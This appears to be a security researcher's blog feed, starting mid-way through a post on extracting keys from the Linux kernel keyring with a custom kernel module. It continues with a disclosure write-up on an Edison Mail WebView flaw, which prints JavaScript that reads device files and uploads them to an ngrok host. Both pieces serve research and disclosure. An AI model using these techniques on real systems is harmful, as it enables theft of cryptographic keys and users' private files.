<p>One of these key types, <code>user</code>, makes it simple to retrieve the key material. We can just use the following command <code>keyctl print &lt;keyid&gt;</code>, where the KeyID is a unique identifier for each key. This identifier can be retrieved using <code>keyctl show</code>. This will output the keys accessible to the current user in a tree-style hierarchy to help visualize which keyring holds which keys. The keyID is the left most numeric value</p><pre><code># keyctl show
Session Keyring
 850642432 --alswrv      0 65534  keyring: _uid_ses.0
 389366852 --alswrv      0 65534   \_ keyring: _uid.0
 1011652325 --alswrv      0     0       \_ user: user_key
 1033559895 --als--v      0     0       \_ asymmetric: asym_pkcs8
  588852448 --als--v      0     0       \_ asymmetric: asym_x509
  171149254 --alsw-v      0     0       \_ logon: logon:logon_key
</code></pre>
<pre><code># keyctl print 1011652325
need pentesting?
</code></pre>
<p>For our purposes that’s all we need to know. If you’re interested in a deeper dive into the KKRS, we suggest checking out the following resources:</p><ul>
<li><a href="https://docs.kernel.org/security/keys/core.html#kernel-key-retention-service">https://docs.kernel.org/security/keys/core.html#kernel-key-retention-service</a></li>
<li><a href="https://man7.org/linux/man-pages/man7/keyrings.7.html">https://man7.org/linux/man-pages/man7/keyrings.7.html</a></li>
<li><a href="https://blog.cloudflare.com/the-linux-kernel-key-retention-service-and-why-you-should-use-it-in-your-next-application/">https://blog.cloudflare.com/the-linux-kernel-key-retention-service-and-why-you-should-use-it-in-your-next-application/</a></li>
</ul>
<h2 id="exploring-the-key-retention-service-implementations">Exploring the Key Retention Service Implementations</h2>
<p>As far as KKRS basics go, that is the gist of it. Our goal is to retrieve key material stored in non-readable key types (anything that’s not <code>user</code>). How would we achieve that? The KKRS is designed such that user-land process are unable to retrieve key material, however, the kernel stores to the key material in memory. This is important - we’ll need to execute within the context of the kernel. Once in the kernel context, we can explore the kernel memory to retrieve the key material, bypassing all controls implemented by the KKRS. To obtain this level of access, we’ll build a custom kernel module which will do the following:</p><ol>
<li>Retrieve a pointer to the key struct</li>
<li>Traverse the key memory structure</li>
<li>Dump the key material for our usage</li>
</ol>
<p>In order to achieve these goals however we will need to get intimate with the KKRS’ implementation. For that we will need to take a look at the Linux Kernel source code and understand the underlying implementation of the KKRS. The QEMU image provided alongside this blog uses uses version <code>6.11.0-rc6-g9d4c304001cf</code> of the Linux Kernel, so we’ll be using that as well. You can view the source <a href="https://elixir.bootlin.com/linux/v6.11-rc6/source">here</a>.</p><h3 id="retrieve-a-pointer-to-the-key-struct">Retrieve a pointer to the key struct</h3>
<p>The first obstacle we need to overcome is finding the key material in memory. Ideally, we could pass a custom kernel module the KeyID of a key we want to recover and it will just work. To make that happen, we need to take a look at how the KKRS is implemented and see if there are any methods that will just give us a pointer to a key. The KKRS key implementation can be found at <a href="https://elixir.bootlin.com/linux/v6.11-rc6/source/security/keys/key.c">linux/security/key/key.c</a>. If we look through the source, we will see there’s a <a href="https://elixir.bootlin.com/linux/v6.11-rc6/source/security/keys/key.c#L670">key_lookup</a> function, which does exactly what we want—it gives us a pointer to a <code>key</code> struct in memory. We just need to give it the key serial, but that’s easy enough to grab from user space using <code>keyctl show</code>. It is important to note that <code>key_lookup</code> returns a pointer to <code>struct key</code>. In the next section we will take a close look at the <code>struct key</code> type.</p><h3 id="traverse-the-key-memory-structure">Traverse the key memory structure</h3>
<p>We now have a method of gaining a pointer to a key struct in memory, but we’ll need to figure out where in the <code>key</code> struct the cryptographic key material is stored. Let’s start by taking a look at the <code>struct key</code> type. This is defined in <a href="https://elixir.bootlin.com/linux/v6.11-rc6/source/include/linux/key.h"><code>include/linux/key.h</code></a>. Reading the source is useful, and the comments make it clear that the <code>union key_payload</code> field holds the cryptographic key material. The KKRS documentation states the following about the <code>payload</code> field:</p><blockquote>
<p>The simplest payload is just data stored in key-&gt;payload directly. In this case, there’s no need to indulge in RCU or locking when accessing the payload. More complex payload contents must be allocated and pointers to them set in the key-&gt;payload.data[] array.</p></blockquote>
<p>This implies that the key material is always stored within a pointer in the <code>key-&gt;payload.data</code> array. However, since it is a void pointer, it can be of any type. We will need to figure out the pointer type for each of the different key types. To do so, we will need to review each key type implementation and figure out how each type stores key material. Covering each key type would take a while, so instead the following table shows where key material is stored for each type:</p><table>
<thead>
<tr>
<th>Key Type</th>
<th>Key Material Type</th>
<th>Key Material Location</th>
<th>Underlying Memory Structure</th>
</tr>
</thead>
<tbody><tr>
<td>User</td>
<td>Entire Key</td>
<td>Key-&gt;payload.data[0]</td>
<td>Raw bytes</td>
</tr>
<tr>
<td>Logon</td>
<td>Entire Key</td>
<td>Key-&gt;payload.data[0]</td>
<td>Raw bytes</td>
</tr>
<tr>
<td>Asymmetric - x509</td>
<td>Public Key Certificate</td>
<td>Key-&gt;payload.data[0]-&gt;key</td>
<td><a href="https://elixir.bootlin.com/linux/v6.11-rc6/source/include/crypto/public_key.h#L23">public_key</a></td>
</tr>
<tr>
<td>Asymmetric - PKCS #8</td>
<td>Private Key</td>
<td>Key-&gt;payload.data[0]-&gt;key</td>
<td><a href="https://elixir.bootlin.com/linux/v6.11-rc6/source/include/crypto/public_key.h#L23">public_key (with private key)</a></td>
</tr>
</tbody></table>
<p><strong>Note</strong>: For this blog, we’ll only focus on recovery of RSA keys.</p><p>For the curious, this table was created by:</p><ol>
<li>Identifying each type’s <a href="https://elixir.bootlin.com/linux/v6.11-rc6/source/include/linux/key-type.h">struct key_type</a> implementation. This structure is implemented by all key types and is used to define a new type of supported key.</li>
<li>Review <code>key_type.preparse</code> and <code>key_type.instantiate</code> for each type. The preparse function directly passes the user supplied data to the key type implementation and enables it to pre-process the key data. The instantiate function is responsible for actually creating the key struct and storing the key material.</li>
</ol>
<p>Now we can actually dump the keys.</p><h2 id="dumping-the-key-material">Dumping the Key Material</h2>
<p>Now that we have a way to find our keys in kernel memory and know how each type stores its key material, it’s time to actually dump the keys. For this, we will need to build a Linux kernel module. Luckily, we wrote the code already and you can find it <a href="/assets/postcontent/linux_kernel_key_dump.tar.gz">here</a>. The implementation itself is pretty straightforward, so we will not review it line by line, but instead cover at a high level what it does:</p><ol>
<li>It obtains a reference to the key in memory via the <code>key_lookup</code> function</li>
<li>It passes the <code>key-&gt;payload</code> value to an appropriate key type dump function based on the key type.</li>
<li>The key type’s dump function contains type specific key material recovery logic</li>
<li>The contents are dumped to the kernel log as a hex dump</li>
</ol>
<p><strong>Note:</strong> Remember, it’s a Linux kernel module, so if you want to use it on your own system, make sure you update the Makefile to point to your kernel’s headers.</p><p>We have already built the Linux kernel module and you can find it at <code>/root/keydump.ko</code> within the accompanying QEMU image. Speaking of the accompanying, QEMU image, let’s jump over to that image and talk about how to use the <code>keydump.ko</code> kernel module.</p><p>First we need to load the module. We’ll pass in two parameters: keytype and keyid.</p><pre><code># insmod /root/keydump.ko keytype=&quot;user&quot; keyid=&quot;1011652325&quot;
</code></pre>
<p>Once loaded, we can view the resulting key dump using <code>dmesg</code>:</p><pre><code># dmesg
[ 7004.792704] USER/LOGON - KEY:6e 65 65 64 20 70 65 6e 74 65 73 74 69 6e 67 3f                                                  need pentesting?
</code></pre>
<p>To view another key’s content, we need to unload the module first.</p><pre><code># rmmod keydump
</code></pre>
<p>Let’s talk about the output for each of the supported types.</p><p><strong>User</strong>:</p><pre><code># insmod /root/keydump.ko keytype=&quot;user&quot; keyid=&quot;1011652325&quot;
# dmesg

[ 7004.792704] USER/LOGON - KEY:6e 65 65 64 20 70 65 6e 74 65 73 74 69 6e 67 3f                                                  need pentesting?
</code></pre>
<p><strong>Logon</strong>:</p><pre><code># insmod /root/keydump.ko keytype=&quot;logon&quot; keyid=&quot;171149254&quot;
# dmesg
[ 7091.147014] USER/LOGON - KEY:72 65 61 63 68 5f 6f 75 74 5f 74 6f 5f 69 76 69 73 69 6f 6e                                      reach_out_to_ivision
</code></pre>
<p><strong>Asymmetric - X.509</strong>:</p><p>X.509 certificates only store the public key, <strong>not</strong> the private key. The hex dump is an ASN.1 encoded <a href="https://datatracker.ietf.org/doc/html/rfc5912"><code>subjectpublickeyinfo</code></a> object.</p><pre><code># insmod /root/keydump.ko keytype=&quot;asymmetric&quot; keyid=&quot;588852448&quot;
# dmesg
[ 7241.728426] Public - ASYM KEY:30 82 01 0a 02 82 01 01 00 b9 b2 e1 11 ab 58 30 b6 92 2a 27 56 5e 06 2c eb fe 81 72 23 1c e9 69  0.............X0..*&#39;V^.,...r#..i
[ 7241.728956] Public - ASYM KEY:c4 06 8e d7 77 59 f3 0e 0e 81 51 6c 2f 13 10 60 39 e5 40 0a 06 d8 24 b5 e8 71 18 be dc 95 61 47  ....wY....Ql/..`9.@...$..q....aG
[ 7241.729334] Public - ASYM KEY:df ac a5 e1 9f 65 95 5d bf 23 5e d1 b4 5b 01 d0 52 a8 10 49 b7 25 60 d9 d0 cd 75 07 73 93 64 cb  .....e.].#^..[..R..I.%`...u.s.d.
[ 7241.729656] Public - ASYM KEY:59 07 94 40 e7 e9 6d 38 8d c1 39 7b 67 56 17 07 f6 11 22 88 da 69 c7 ec cf c2 4e 97 9b a9 3b 63  Y..@..m8..9{gV....&quot;..i....N...;c
[ 7241.730113] Public - ASYM KEY:78 67 3c d0 e7 fc 97 e5 79 fd ce 9f 27 45 c8 dc b6 17 4e bb 61 45 5f ba 02 ad 1a b2 50 6a a0 6e  xg&lt;.....y...&#39;E....N.aE_.....Pj.n
[ 7241.730432] Public - ASYM KEY:1e 7f e3 17 47 9c 89 97 8d fd 4e 87 f8 b7 76 54 da 8a fd 7e 49 96 e0 dd f0 5b 70 2f 5c 8d 67 af  ....G.....N...vT...~I....[p/\.g.
[ 7241.730749] Public - ASYM KEY:22 0d a9 8a d1 29 81 37 76 08 99 70 04 ad 40 e9 5f 8c 11 3c 06 8e 6f b4 fe 09 68 69 9c ea 9e 41  &quot;....).7v..p..@._..&lt;..o...hi...A
[ 7241.731262] Public - ASYM KEY:a4 fc ed 60 71 88 34 5e 19 ff d4 23 d4 b2 2a bc 46 e3 a8 68 e0 55 8b c9 75 3b df 9a 36 67 ca a4  ...`q.4^...#..*.F..h.U..u;..6g..
[ 7241.731603] Public - ASYM KEY:13 b9 11 ca 78 a9 c7 2f 87 02 03 01 00 01                                                        ....x../......
</code></pre>
<p>We need to convert it back into a usable PEM format. We can achieve this with:</p><pre><code>echo &quot;30 82 01 ...KEY HEX DUMP&quot; | xxd -r -ps | openssl rsa -pubin

-----BEGIN PUBLIC KEY-----

hwIDAQAB
-----END PUBLIC KEY-----
</code></pre>
<p><strong>Asymmetric - PKCS #8</strong>:</p><p>The PKCS #8 contains the private key (which be used to derive the public key), and is an ASN.1 encoded <a href="https://datatracker.ietf.org/doc/html/rfc8017"><code>RSAPrivateKey</code></a> object.</p><pre><code># insmod /root/keydump.ko keytype=&quot;asymmetric&quot; keyid=&quot;1033559895&quot;
# dmesg
[ 4868.115468] Private - ASYM KEY:30 82 04 a4 02 01 00 02 82 01 01 00 b9 b2 e1 11 ab 58 30 b6 92 2a 27 56 5e 06 2c eb fe 81 72 23  0................X0..*&#39;V^.,...r#
[ 4868.116046] Private - ASYM KEY:1c e9 69 c4 06 8e d7 77 59 f3 0e 0e 81 51 6c 2f 13 10 60 39 e5 40 0a 06 d8 24 b5 e8 71 18 be dc  ..i....wY....Ql/..`9.@...$..q...
(...30 Lines Skipped)
[ 4868.129325] Private - ASYM KEY:43 6a ff 4b 71 02 81 80 06 71 05 dc 21 85 f8 81 a6 c0 33 cc 53 f3 ce 20 70 48 df f2 7f c9 5d 55  Cj.Kq....q..!.....3.S.. pH....]U
[ 4868.129643] Private - ASYM KEY:7c bd cf 96 df 87 51 5e aa 38 fb 09 e1 20 d1 74 44 ac 80 0e 66 12 5f b1 47 5a 4f fd ea 3c ec 98  |.....Q^.8... .tD...f._.GZO..&lt;..
[ 4868.130121] Private - ASYM KEY:b2 00 6a b0 93 99 3d ee 62 02 02 94 31 13 38 f5 cb ff c6 82 bd 83 1f 57 47 53 ae d5 ca 88 e3 3d  ..j...=.b...1.8........WGS.....=
[ 4868.130444] Private - ASYM KEY:5c aa 95 44 f1 8c 69 01 0a 6e 2e 73 b5 13 bf 54 1d 67 22 e4 df 2f 16 13 8c 7c a6 27 70 a4 93 c1  \..D..i..n.s...T.g&quot;../...|.&#39;p...
[ 4868.130764] Private - ASYM KEY:6a 36 87 12 86 43 98 16                                                                          j6...C..
</code></pre>
<p>We need to convert it to back to into a usable PEM format. We can achieve this with:</p><pre><code>echo &quot;30 82 01 ...KEY HEX DUMP&quot; | xxd -r -ps | openssl rsa

-----BEGIN PRIVATE KEY-----

FhOMfKYncKSTwWo2hxKGQ5gW
-----END PRIVATE KEY-----
</code></pre>
<h2 id="making-it-portable">Making it Portable</h2>
<p>This blog post started with a rant and two problem statements. We’ve reviewed a solution to one of those problems: recovering key material. The process here, however, relies on importing kernel headers, which on production embedded systems are likely to be missing.<a href="https://sotoventura.com/dumping-keys-from-the-linux-key-retention-service-part-2.html"> In the next blog post</a>, we’ll talk about how to cross-compile kernel modules for AARCH64 without needing to depend on Linux kernel headers being preset.</p>
            ]]>
        </content>
    </entry>
    <entry>
        <title>Bsides Buffalo 2022</title>
        <author>
            <name>Jesson Soto Ventura</name>
        </author>
        <link href="https://sotoventura.com/bsides-buffalo-2022.html"/>
        <id>https://sotoventura.com/bsides-buffalo-2022.html</id>

        <updated>2022-06-13T00:00:00-04:00</updated>
            <summary>
                <![CDATA[
                    Hacking smart IOT devices that have a web interface typically depends on the same skill set as web application hacking. Plenty of resources exist that cover web application hacking and these resources largely map 1-to-1 with IOT devices. But what about IOT devices that are missing a web interface, how&hellip;
                ]]>
            </summary>
        <content type="html">
            <![CDATA[
                <p><span class="yt-core-attributed-string yt-core-attributed-string--white-space-pre-wrap" dir="auto" role="text"><span class="yt-core-attributed-string--link-inherit-color" dir="auto">Hacking smart IOT devices that have a web interface typically depends on the same skill set as web application hacking. Plenty of resources exist that cover web application hacking and these resources largely map 1-to-1 with IOT devices. But what about IOT devices that are missing a web interface, how do you hack those? How do you even get started? Through this talk, we’ll hack a couple of IOT devices (a smart grill and light bulb) along the way, we’ll learn details about common non-HTTP attack surfaces and how to leverage them for your future hack</span></span></p>
<p>Bsides Buffalo was great! Thanks to everyone who came to watch my talk. Missed it?  Checkout the recording here: <a href="https://www.youtube.com/watch?v=5_tWvbeOs-A">https://www.youtube.com/watch?v=5_tWvbeOs-A</a></p>
            ]]>
        </content>
    </entry>
    <entry>
        <title>Thotcon 0x0B</title>
        <author>
            <name>Jesson Soto Ventura</name>
        </author>
        <link href="https://sotoventura.com/thotcon-0x0b.html"/>
        <id>https://sotoventura.com/thotcon-0x0b.html</id>

        <updated>2020-12-20T00:00:00-05:00</updated>
            <summary>
                <![CDATA[
                    Let's explore the world of Android WebViews through two popular applications - an Android email client and an advertising platform. Through these case studies, we will learn how insecure WebViews provided remote attackers and advertisers access to user's external storage. Thanks ThotCon. Missed the Talk? Checkout the recording from Shmoocon&hellip;
                ]]>
            </summary>
        <content type="html">
            <![CDATA[
                <p>Let's explore the world of Android WebViews through two popular applications - an Android email client and an advertising platform. Through these case studies, we will learn how insecure WebViews provided remote attackers and advertisers access to user's external storage.</p>
<p>Thanks ThotCon. Missed the Talk? Checkout the recording from <a href="https://www.youtube.com/watch?v=NCEQ0QIyicE">Shmoocon 2020</a></p>
            ]]>
        </content>
    </entry>
    <entry>
        <title>Abusing WebViews To Steal Files via Email</title>
        <author>
            <name>Jesson Soto Ventura</name>
        </author>
        <link href="https://sotoventura.com/abusing-webviews-to-steal-files-via-email.html"/>
        <id>https://sotoventura.com/abusing-webviews-to-steal-files-via-email.html</id>

        <updated>2019-08-25T00:00:00-04:00</updated>
            <summary>
                <![CDATA[
                    A few months ago, I was testing the email functionality on a company’s contact us page, when I sent an email to myself containing: &lt;script&gt; alert(&quot;Hi, It&#39;s almost lunch time&quot;) &lt;/script&gt; It actually was close to lunch time, so I wrapped up testing and waited for the email to arrive&hellip;
                ]]>
            </summary>
        <content type="html">
            <![CDATA[
                <p>A few months ago, I was testing the email functionality on a company’s contact us page, when I sent an email to myself containing:</p><pre><code class="language-wp-block-code">&lt;script&gt; alert(&quot;Hi, It&#39;s almost lunch time&quot;) &lt;/script&gt;
</code></pre>
<p>It actually was close to lunch time, so I wrapped up testing and waited for the email to arrive in my inbox. Once it arrived, I opened my email client and checked the email, when all of a sudden I was met with this popup:</p><p><a href="https://sotoventura.com/4b8bc0f5e048b4ef4084b0a1d789f544f0dd7b06.png"></a></p><blockquote>
<p>Copied with ❤️ from <a href="https://research.ivision.com/abusing-webviews-to-steal-files-via-email.html">ivision’s research blog</a></p></blockquote>
<p>This was bad. At the time I was using Edison Mail as my primary email client. It offered a number of useful features including package tracking, easy integration with my calendar, and smart replies making it a useful email client. But as soon as I saw that popup, I knew I was going to have to go back to using Gmail. Getting this pop-up was bad. Even before seriously looking into the issue – I had a hunch that the impact of the issue could be serious.</p><p>TL;DR:</p><p>While using Edison Mail – I found that it would execute JavaScript stored inside of emails. This functionality could be abused to read files from user’s external storage as well as all their emails. The contents of these files could then be uploaded to a remote server. All by only <strong>OPENING</strong> a malicious email.</p><h2 id="finding-the-dangerous-webviews-settings">Finding the dangerous WebViews Settings</h2>
<p>Android developers frequency use WebViews to incorporate web features into their applications. Normally, when developers use WebViews the default settings are used. Unfortunately, Edison Mail made a number of WebView changes that facilitated attacks against its users. Let’s start off by finding the WebView changes made by Edison Mail.</p><p>As WebView settings are typically contained within the WebSettings class, we should be able to search the application’s decompiled source for any invocations of the WebSettings class. A quick search turned up a number of settings changes made by the application.</p><p>Below are a three of the most dangerous settings that were enabled:</p><pre><code class="language-wp-block-code">setJavaScriptEnabled(true)
setAllowFileAccessFromFileURLs(true)
setAllowUniversalAccessFromFileURLs(true)
</code></pre>
<p>Alone each of these settings is fairly benign, but together and put into the context of an email application each setting change was dangerous. In particular, the <code>FileAccess</code> settings were dangerous as they give contents inside the WebView access to local file, but I am getting a head of myself.</p><h2 id="a-brief-lesson-on-webview-settings">A brief lesson on WebView Settings</h2>
<p>First, let’s review the list of enabled WebView settings to understand a bit about each one.</p><p><code>setJavaScriptEnabled</code> – does exactly what the name implies and enables JavaScript to be executed inside of the WebView. It seems like this feature should be enabled by default since every developer and every application almost always seem to have this feature enabled. Alone this feature is benign, but when coupled with other setting changes it can be quite dangerous.</p><p><code>SetAllowFileAccessFromFileURls</code>– allows any JavaScript inside of files loaded using the File URI scheme (<code>file:///</code>) to request other resources using the file’s URI. Now to fully appreciate how powerful this is, let’s take a step back and discuss the File URI scheme.</p><p>Content can loaded into WebViews using a number of schemes. The most common is the Universal Resource Locator (URL), but other formats like the Data scheme also exist. In this case, the file scheme is a special scheme that allows a WebView to load local files. Applications typically use this scheme to load locally stored content into the WebView.</p><p>This is where the <code>SetAllowFileAccessFromFileURLs</code> comes into play. By default, file loaded using the File URI scheme are not able to load additional resources. Enabling the <code>SetAllowFileAccessFromFileURLS</code> lets them load other local resources using the File URI scheme.</p><p><code>setAllowUniversalAccessFromFileURLs</code> – allows JavaScript inside of files loaded using the File URI scheme to request resources using schemes other than the File URI scheme. Of the three setting changes made by Edison mail – this is the most dangerous. It disables a fundamentally important protection and allows local files to request resource using HTTP/S.</p><h2 id="testing-webviews-with-google-chrome">Testing WebViews with Google Chrome</h2>
<p>So far we know that the application is taking our emails and executing the JavaScript inside of our email. We also know that the application allows local file resources to request other resources, but we don’t know if our JavaScript is being loaded as a file resource or using some other method. To answer that question, let’s do some dynamic testing.</p><p>Testing WebViews is simple – we can leverage the <code>setWebContentsDebuggingEnabled</code> setting. This setting will let us connect to the WebView running on our device using Chrome. From there, it behaves like a normal web page and we can use Chrome’s developer console to test the WebView.</p><p>But before we get to that stage, we need to enable setWebContentsDebuggingEnabled. To do this decompile the application and added this line of code to any of the applications’ OnCreate methods preferably one that is triggered at launch:</p><pre><code class="language-wp-block-code">const/4 v1, 0x01

invoke-static {v1}, Landroid/webkit/WebView;-&gt;setWebContentsDebuggingEnabled(Z)V
</code></pre>
<p>The best part about this setting is that it is applied globally, so one call is all it takes to debug any newly created WebViews.</p><p>From here, we can connect our to Android device to our computer and navigate to <code>chrome://inspect</code> using Chrome. Once we open Edison Mail and it launches a WebView we should see it show up.</p><p><a href="https://sotoventura.com/12cd5a5b0a2991b6778c765d5ba32c13a5328399.png"></a></p><p>Now we are ready to start poking around.</p><h2 id="time-to-steal-some-files">Time to steal some files</h2>
<p>With our testing environment setup, let’s see if we can break something. The first thing we need to do is review the context of the WebView. Chrome shows us this, before even opening the WebView.</p><p>Under <code>WebView in com.easilydo.mail</code> we see that there are a number of <code>about:blank</code> pages. This means that a local file is being used to render the email’s content. It is not imminently apparent, but <code>about:blank</code> is just an alias for <code>file:///android_asset</code>. This means that we should be able to read arbitrary files from the device. Let’s validate that.</p><p>Pasting the following code into the console:</p><pre><code class="language-wp-block-code">function getfile(filepath){
  var request = new XMLHttpRequest();
  request.onreadystatechange = function() {
    var t = new XMLHttpRequest();
    console.warn(this.responseText);
  };
  xhttp.open(&quot;GET&quot;, filepath, false);
  xhttp.send();
}

getfile(&quot;file:///sdcard/test.file&quot;)
</code></pre>
<p>Gives us this the contents of /sdcard/test.file</p><p><a href="https://sotoventura.com/96c413745aa6f44c848a265bafc9fe5f460ddc2c.png"></a></p><p>Awesome – We were able to read the contents of a file stored on the user’s external storage. The next step is to see if we can upload the contents of the files somewhere. Remember the <code>setAllowUniversalAccessFromFileURLs</code> flag? Normally, It would be prevent us from uploading files, but the setting was enabled. To perform a quick test, we can use the following code:</p><pre><code class="language-wp-block-code">function uploadfile(filepath, url){
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
  var upload = new XMLHttpRequest();
  upload.open(&quot;GET&quot;, url + &quot;?&quot; + this.responseText , false)
  upload.send()
  };
  xhttp.open(&quot;GET&quot;, filepath, false);
  xhttp.send();
}

uploadfile(&quot;file:///sdcard/test.file&quot;, &quot;http://3164c2ef.ngrok.io&quot;)
</code></pre>
<p>A look over at the server and sure enough the file’s contents was uploaded</p><pre><code class="language-wp-block-code">Serving HTTP on 0.0.0.0 port 3333 (http://0.0.0.0:3333/) ...
127.0.0.1 - - [12/Aug/2019 15:19:15] &quot;GET /? HTTP/1.1&quot; 200 -
127.0.0.1 - - [12/Aug/2019 15:19:15] &quot;GET /?THIS%20FILE%20IS%20ON%20THE%20SDCARD?!?! HTTP/1.1&quot; 200 
</code></pre>
<p>It worked! So now we know that we are able to both read files from the filesystem and upload them to arbitrary sites. With this functionality, we could steal a number of sensitive files from a user – including:</p><ul>
<li>All their emails, which are stored at: file:///data/data/com.easilydo.mail/databases/ko.db</li>
<li>All their pictures, which are stored at: file:///sdcard/DCIM</li>
<li>All files stored at file:///sdcard/*</li>
</ul>
<p>What makes this entire attack more dangerous is the fact that it is possible to use the File URI scheme to traverse a directory. Finally, since the file uploads only stop once the user closes the application, it is possible to perform long running tasks like archiving and uploading all of a user’s files. All that the attacker needs to do is convince the user to <strong>OPEN</strong> the email.</p><h2 id="protecting-against-future-attacks">Protecting against future attacks</h2>
<p>If not properly secured, WebViews can be used to attack applications. However, these attacks typically rely on or more of the following conditions existing:</p><ul>
<li>Resources being loaded from external storage</li>
<li>Third-party resources being loaded without domain white listing</li>
<li>Allowing JavaScript to be executed</li>
<li>Usage of dangerous JavaScript Interfaces</li>
<li>Modification of WebSettings to permit access to privileged data</li>
</ul>
<p>If any of the above conditions exist, than it may be possible to leverage one or more condition to gain a foothold inside of the WebView. As a precaution, we have see that a number of applications are performing the following actions to protect against WebView attacks:</p><ul>
<li>Applications that are caching content in external storage will store the hash of the file preventing cached files from being modified</li>
<li>Domains and resources are being white listed to prevent unknown third parties form interacting with the WebView</li>
<li>Applications will filter out dangerous JavaScript functions</li>
<li>Dangerous JavaScript functions will be overloaded and disabled</li>
<li>JavaScript interfaces are used sparely and assessed to ensure that they can not be abused</li>
</ul>
<p>Of the above solutions, Edison mail used the third approach to protecting their users. The application now filters out any dangerous scripts from the email prior to rendering it in a WebView. As of version 1.7.2 the application is no longer vulnerable to the payloads shared above.</p><p>Details about the disclosure can be found at: <a href="https://github.com/ivision-research/disclosures/blob/main/edison-mail-2019-advisory.md">2019 Edison Mail Advisory</a>.</p>
            ]]>
        </content>
    </entry>
</feed>
